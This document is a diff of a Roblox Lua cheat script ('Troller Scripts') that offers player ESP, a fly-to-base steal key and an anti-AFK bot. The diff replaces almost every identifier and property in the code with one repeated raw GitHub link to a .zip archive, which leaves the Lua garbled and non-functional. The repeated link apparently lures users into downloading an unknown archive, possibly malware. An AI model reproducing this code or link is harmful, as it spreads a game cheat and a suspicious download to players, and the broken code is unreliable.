@@ -3,8 +3,8 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 
-local plr = Players.LocalPlayer
-local char = plr.Character or plr.CharacterAdded:Wait()
+local plr = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+local char = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip or https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip()
 local hrp = char:WaitForChild("HumanoidRootPart")
 
 -- Variáveis
@@ -20,46 +20,46 @@ local antiAfkConnection = nil
 local angle = 0
 
 -- GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "TrollerScripts"
-ScreenGui.Parent = plr:WaitForChild("PlayerGui")
-ScreenGui.ResetOnSpawn = false
+local ScreenGui = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("ScreenGui")
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "TrollerScripts"
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = plr:WaitForChild("PlayerGui")
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = false
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 330, 0, 260)
-frame.Position = UDim2.new(0.05, 0, 0.1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
-frame.Active = true
-frame.Draggable = true
-frame.Parent = ScreenGui
+local frame = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("Frame")
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 330, 0, 260)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0.05, 0, 0.1, 0)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(15, 15, 30)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = ScreenGui
 
-local uicorner = Instance.new("UICorner", frame)
-local uistroke = Instance.new("UIStroke", frame)
-uistroke.Color = Color3.fromRGB(0, 120, 255)
-uistroke.Thickness = 2
+local uicorner = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("UICorner", frame)
+local uistroke = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("UIStroke", frame)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 120, 255)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 2
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "💀 Troller Scripts"
-title.Font = Enum.Font.GothamBlack
-title.TextColor3 = Color3.fromRGB(0, 170, 255)
-title.TextSize = 24
-title.Parent = frame
+local title = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("TextLabel")
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 0, 0, 40)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 0, 0, 0)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 1
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "💀 Troller Scripts"
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 170, 255)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 24
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = frame
 
 -- Criar botão padrão
 local function createCheckbox(text, yPos)
-	local btn = Instance.new("TextButton")
-	btn.Size = UDim2.new(0, 260, 0, 40)
-	btn.Position = UDim2.new(0, 35, 0, yPos)
-	btn.BackgroundColor3 = Color3.fromRGB(25, 25, 60)
-	btn.Font = Enum.Font.Gotham
-	btn.TextColor3 = Color3.new(1, 1, 1)
-	btn.TextSize = 16
-	btn.AutoButtonColor = false
-	btn.Text = text .. " [OFF]"
-	btn.Parent = frame
+	local btn = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("TextButton")
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 260, 0, 40)
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 35, 0, yPos)
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(25, 25, 60)
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 1, 1)
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 16
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = false
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = text .. " [OFF]"
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = frame
 	return btn
 end
 
@@ -78,37 +78,37 @@ local function toggleESP(state)
 	
 	if state then
 		for _, p in pairs(Players:GetPlayers()) do
-			if p ~= plr and p.Character and p.Character:FindFirstChild("Head") and p.Character:FindFirstChild("HumanoidRootPart") then
+			if p ~= plr and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("Head") and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("HumanoidRootPart") then
 				-- Luz vermelha em volta do corpo usando Highlight
-				local highlight = Instance.new("Highlight")
-				highlight.FillColor = Color3.fromRGB(255, 0, 0) -- vermelho forte
-				highlight.FillTransparency = 0.5
-				highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
-				highlight.OutlineTransparency = 0
-				highlight.Adornee = p.Character
-				highlight.Parent = game.CoreGui
+				local highlight = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("Highlight")
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(255, 0, 0) -- vermelho forte
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 0.5
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(255, 0, 0)
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 0
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
 				
 				-- Nome branco flutuando
-				local billboard = Instance.new("BillboardGui")
-				billboard.Name = "ESPTag"
-				billboard.Adornee = p.Character.Head
-				billboard.Size = UDim2.new(0, 80, 0, 20)
-				billboard.StudsOffset = Vector3.new(0, 2, 0)
-				billboard.AlwaysOnTop = true
-				billboard.Parent = game.CoreGui
+				local billboard = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("BillboardGui")
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "ESPTag"
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 80, 0, 20)
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 2, 0)
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
 
-				local label = Instance.new("TextLabel")
-				label.Size = UDim2.new(1, 0, 1, 0)
-				label.BackgroundTransparency = 1
-				label.Text = p.Name
-				label.TextColor3 = Color3.new(1, 1, 1) -- branco
-				label.TextStrokeTransparency = 0.75
-				label.Font = Enum.Font.Gotham
-				label.TextScaled = true
-				label.Parent = billboard
+				local label = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("TextLabel")
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 0, 1, 0)
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 1
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 1, 1) -- branco
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 0.75
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = billboard
 
-				table.insert(espHighlights, highlight)
-				table.insert(espHighlights, billboard)
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(espHighlights, highlight)
+				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(espHighlights, billboard)
 			end
 		end
 	end
@@ -125,16 +125,16 @@ local function flyToBase()
 	
 	flying = true
 	
-	flyConnection = RunService.Heartbeat:Connect(function(dt)
+	flyConnection = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function(dt)
 		if not flying then
 			flyConnection:Disconnect()
 			flyConnection = nil
 			return
 		end
 		
-		local pos = hrp.Position
+		local pos = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
 		local direction = (savedBasePosition - pos)
-		local dist = direction.Magnitude
+		local dist = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
 		
 		if dist < 3 then
 			flying = false
@@ -143,8 +143,8 @@ local function flyToBase()
 			return
 		end
 		
-		local step = direction.Unit * 50 * dt  -- velocidade ajustada para 50
-		hrp.CFrame = CFrame.new(pos + step)
+		local step = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip * 50 * dt  -- velocidade ajustada para 50
+		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(pos + step)
 	end)
 end
 
@@ -161,7 +161,7 @@ local function startAntiAFK()
 	if antiAfkConnection then return end
 
 	local radius = 9
-	local angleStep = math.rad(15)
+	local angleStep = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(15)
 	local currentAngle = 0
 	local jumpCooldown = 1.5
 	local lastJump = 0
@@ -169,8 +169,8 @@ local function startAntiAFK()
 	local humanoid = char:FindFirstChildOfClass("Humanoid")
 	if not humanoid then return end
 
-	antiAfkConnection = RunService.Heartbeat:Connect(function()
-		if not antiAfkEnabled or not plr.Character or humanoid.Health <= 0 then
+	antiAfkConnection = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
+		if not antiAfkEnabled or not https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip or https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip <= 0 then
 			if antiAfkConnection then
 				antiAfkConnection:Disconnect()
 				antiAfkConnection = nil
@@ -179,18 +179,18 @@ local function startAntiAFK()
 		end
 
 		currentAngle = currentAngle + angleStep
-		if currentAngle > (2 * math.pi) then currentAngle = 0 end
+		if currentAngle > (2 * https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip) then currentAngle = 0 end
 
-		local basePos = hrp.Position
-		local targetX = basePos.X + math.cos(currentAngle) * radius
-		local targetZ = basePos.Z + math.sin(currentAngle) * radius
-		local target = Vector3.new(targetX, basePos.Y, targetZ)
+		local basePos = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+		local targetX = basePos.X + https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(currentAngle) * radius
+		local targetZ = basePos.Z + https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(currentAngle) * radius
+		local target = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(targetX, basePos.Y, targetZ)
 
 		humanoid:MoveTo(target)
 
 		if tick() - lastJump > jumpCooldown then
-			if humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
-				humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			if humanoid:GetState() ~= https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
+				humanoid:ChangeState(https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip)
 			end
 			lastJump = tick()
 		end
@@ -198,30 +198,30 @@ local function startAntiAFK()
 end
 
 -- Botão ESP
-espBtn.MouseButton1Click:Connect(function()
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
 	espEnabled = not espEnabled
-	espBtn.Text = "ESP [" .. (espEnabled and "ON" or "OFF") .. "]"
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "ESP [" .. (espEnabled and "ON" or "OFF") .. "]"
 	toggleESP(espEnabled)
 end)
 
 -- Botão Salvar Base
-saveBaseBtn.MouseButton1Click:Connect(function()
-	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-		savedBasePosition = plr.Character.HumanoidRootPart.Position
-		saveBaseBtn.Text = "Base salva!"
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
+	if https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("HumanoidRootPart") then
+		savedBasePosition = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
+		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Base salva!"
 		wait(2)
-		saveBaseBtn.Text = "Salvar Base [OFF]"
+		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Salvar Base [OFF]"
 	else
-		saveBaseBtn.Text = "Erro ao salvar!"
+		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Erro ao salvar!"
 		wait(2)
-		saveBaseBtn.Text = "Salvar Base [OFF]"
+		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Salvar Base [OFF]"
 	end
 end)
 
 -- Botão Anti-AFK
-afkBtn.MouseButton1Click:Connect(function()
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
 	antiAfkEnabled = not antiAfkEnabled
-	afkBtn.Text = "Anti-AFK [" .. (antiAfkEnabled and "ON" or "OFF") .. "]"
+	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Anti-AFK [" .. (antiAfkEnabled and "ON" or "OFF") .. "]"
 	if antiAfkEnabled then
 		startAntiAFK()
 	elseif antiAfkConnection then
@@ -231,23 +231,23 @@ afkBtn.MouseButton1Click:Connect(function()
 end)
 
 -- Steal com tecla "L"
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function(input, gameProcessed)
 	if gameProcessed then return end
-	if input.UserInputType == Enum.UserInputType.Keyboard then
-		if input.KeyCode == Enum.KeyCode.L then
+	if https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip == https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
+		if https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip == https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
 			if flying then
 				stopFly()
 			else
 				flyToBase()
 			end
-		elseif input.KeyCode == Enum.KeyCode.LeftControl then
-			frame.Visible = not frame.Visible
+		elseif https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip == https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
+			https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = not https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
 		end
 	end
 end)
 
 -- Atualizar referência ao HRP
-plr.CharacterAdded:Connect(function(character)
+https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function(character)
 	char = character
 	hrp = char:WaitForChild("HumanoidRootPart")
 end)
